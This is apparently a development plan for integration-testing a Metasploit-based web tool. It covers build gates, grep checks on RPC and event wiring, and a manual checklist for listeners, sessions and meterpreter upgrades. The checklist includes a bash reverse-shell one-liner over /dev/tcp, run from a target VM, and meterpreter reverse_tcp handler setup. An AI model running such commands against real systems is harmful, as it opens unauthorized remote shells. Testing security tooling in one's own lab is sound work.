---
depends_on:
  - 07-server-hydrate-on-start
  - 08-server-tests
  - 09-web-shell-tab-input-attach-detach
  - 11-web-sync-subscribe-order
---

# Plan 12: Integration — Auto Gates + Cross-Module Checks + Manual Checklist

## Goal

Final integration pass. Plan-runner's built-in integration agent (see `apps/server/src/plan-runner/Layers/PlanRunner.ts:1132`) runs after every other plan in this feature lands. This plan tells it exactly what to verify and what to embed in the final report for the human operator.

## Scope

- **Auto-runnable gates** — every command MUST exit 0.
- **Cross-plan integration verifications** — grep-based assertions that every plan landed correctly together.
- **Manual integration checklist** — markdown checklist for the human (requires `msfrpcd` on `$PATH` + a target VM); embedded verbatim in the integration agent's final report.
- **Known limitations** — documented for the human so they don't file these as bugs.

## Steps

### Step 1. Run all task-completion gates

```bash
bun fmt
bun lint
bun typecheck
bun run test
```

All four MUST exit 0. If any fails, integration plan fails.

### Step 2. Cross-plan integration verifications

Run each grep below. Each MUST hit exactly the expected number of matches.

```bash
# 2a. Both new RPC methods registered AND wired in ws.ts handler block.
grep -c "metasploitSessionAttach\|metasploitSessionDetach" packages/contracts/src/rpc.ts
# Expect: at least 6 (2 each of: WS_METHODS entry, RPC declaration, WsRpcGroup entry).

grep -c "WS_METHODS.metasploitSessionAttach\|WS_METHODS.metasploitSessionDetach" apps/server/src/ws.ts
# Expect: at least 2 (one per handler key).

# 2b. New event types declared, exported, used in store.
grep -c "ListenerUpdatedEvent\|ConnectionChangedEvent" packages/contracts/src/metasploit.ts
# Expect: at least 4 (declaration + union entry, each).

grep -c "case \"listener.updated\"\|case \"connection.changed\"" apps/web/src/metasploitStore.ts
# Expect: 2.

# 2c. Hardcoded LHOST/LPORT eliminated from sessionUpgrade.
grep -A2 "session.shell_upgrade" apps/server/src/metasploit/Layers/MetasploitService.ts
# Expect output to contain `lhost` and `lport` derived from listener — NOT `MSFRPC_HOST` or `"0"`.

# 2d. emitSessionOutput is on the contract.
grep -c "emitSessionOutput" apps/server/src/metasploit/Services/MetasploitService.ts
# Expect: 1 (the declaration).

# 2e. ensureStarted is called from both status() and subscribe.
grep -B1 -A3 "ensureStarted" apps/server/src/metasploit/Layers/MetasploitService.ts | grep -c "yield\* ensureStarted"
# Expect: at least 3 (status, subscribe, createListener).

# 2f. Hydration runs in ensureStartedRaw.
grep -c "hydrateState" apps/server/src/metasploit/Layers/MetasploitService.ts
# Expect: at least 2 (declaration + invocation).

# 2g. Subscribe-first order in web sync.
node -e "const t=require('fs').readFileSync('apps/web/src/components/hack/useMetasploitSync.ts','utf8'); const onEv=t.indexOf('.onEvent('); const status=t.indexOf('.status('); if (onEv === -1 || status === -1 || onEv > status) { process.exit(1); } else { process.exit(0); }"
# Expect exit 0 — onEvent appears before status() in source.
```

If any of the above checks fail, the integration agent flags a regression: name the plan that should have produced the matching change and re-spawn its executor.

### Step 3. Manual integration checklist

Embed the following block VERBATIM in the integration agent's final report markdown so the human operator can run it locally with `msfrpcd` available:

````markdown
## Manual Integration Checklist (run on dev workstation)

**Prerequisites**: `msfrpcd` on `$PATH`, a target VM (or Docker container) reachable from the workstation, and the fenrir dev server running.

### Setup

1. `bun --filter @fenrir/server dev` — server starts.
2. Open browser, navigate to fenrir, open Hack workspace.

### Connection state

- [ ] Within ~5s of opening Hack workspace, footer shows **"Connected"** (was previously stuck on "Disconnected").
- [ ] Pre-existing listeners (start `msfconsole` first, run `use exploit/multi/handler; set PAYLOAD ...; exploit -j`) appear in the sidebar after a fenrir page reload — proves hydration works.

### Listener lifecycle

3. Click "Create Listener". Configure:
   - Payload: `linux/x86/meterpreter/reverse_tcp`
   - LHOST: `0.0.0.0`
   - LPORT: `4444`
- [ ] Listener appears with status `waiting` immediately.
- [ ] Within ~4 seconds (2s poll + 1 debounce-cycle hit), status flips to `active`.

### Session reception + association

4. From target VM:
   ```bash
   bash -c "bash -i >& /dev/tcp/<workstation-ip>/4444 0>&1"
   ```
- [ ] Session appears in fenrir sidebar.
- [ ] Session is grouped under the listener you created (NOT under "Unattached").

### Interactive shell

5. Click the session → shell tab opens.
6. Type `id` + Enter.
- [ ] Output streams back to the terminal (uid, gid, etc.).
7. Type `whoami` + Enter.
- [ ] Output streams.

### Upgrade to meterpreter

8. Click "Upgrade to Meterpreter" button.
- [ ] Button label changes to `"Upgrading…"`, button disabled.
- [ ] Within ~10 seconds, the shell session disappears AND a new meterpreter session takes its place. NO duplicate session lingering.
- [ ] If you had the shell session selected, the workspace re-renders pointing at the new meterpreter session id.

### Orphan rejection

9. From `msfconsole` (separate from fenrir's msfrpcd, but ideally same host so they share state — not always possible): manually open a session NOT through any fenrir listener, e.g. `sessions -i <id>` after a manual exploit. Or simulate by stopping the listener while a session is alive.
- [ ] Click "Upgrade to Meterpreter" on the orphan session.
- [ ] Session disappears from fenrir UI within 1s. Browser console shows `[upgrade] failed for ...` with `MetasploitListenerLookupError`.

### Listener stop

10. Click "Stop" on a listener.
- [ ] Status flips to `stopped` within ~4s, then listener entry is removed.
- [ ] Sessions tied to that listener stay alive but are now "Unattached" / orphan.

### Reconnect / refresh

11. With a live shell session open and streaming, refresh the browser (Cmd+R / Ctrl+R).
- [ ] Footer goes Disconnected → Connected within ~3s.
- [ ] Listeners + sessions all rehydrate.
- [ ] Click the same shell session — terminal opens BLANK (scrollback lost — known limitation).
- [ ] Type `id` — output streams again. Live shell still works.

### Cleanup

12. Close session in `msfconsole` (`sessions -k <id>`).
- [ ] Session disappears from fenrir UI within ~4s.

13. Stop fenrir server (Ctrl+C).
- [ ] msfrpcd process is killed (verify with `pgrep msfrpcd`).
````

### Step 4. Known limitations (embed in report)

```markdown
## Known Limitations

- **Browser refresh loses shell scrollback.** The xterm buffer is in-memory only; the server doesn't ring-buffer per-session output. Live shell I/O resumes immediately on remount, but lines printed before the refresh are gone. (Future work: server-side ring buffer + `session.outputReplay` event.)
- **Orphan sessions cannot be upgraded.** A session not associated with any fenrir-created listener has no LHOST/LPORT we trust to pass to `session.shell_upgrade`. Attempted upgrade rejects with `MetasploitListenerLookupError` and removes the session from the UI. The underlying msfrpcd session stays alive — recover via `msfconsole`.
- **`connection.changed` requires server+web shipped together.** New event type; an old client connecting to a new server will ignore the event and show "Disconnected" forever. Single-tenant local dev tool — not a production concern.
- **No msfvenom integration.** Listener creation works, but generating delivery payloads (msfvenom-style) is out of scope for this fix and tracked as a future enhancement.
```

## Validation

The integration agent itself runs Steps 1 + 2 above. If both pass, plan 12 is complete. The integration agent embeds Steps 3 + 4 into its final report; the human runs Step 3 separately.

```bash
bun fmt && bun lint && bun typecheck && bun run test
```

All four green = automated portion of plan 12 done.

## Done Criteria

- [ ] `bun fmt` exits 0.
- [ ] `bun lint` exits 0.
- [ ] `bun typecheck` exits 0.
- [ ] `bun run test` exits 0; all new test files in `apps/server/src/metasploit/__tests__/` pass.
- [ ] All Step 2 grep assertions return the expected counts.
- [ ] Step 2g order check passes (subscribe before list).
- [ ] Integration agent's final report includes the Manual Integration Checklist (Step 3) and Known Limitations (Step 4) verbatim.
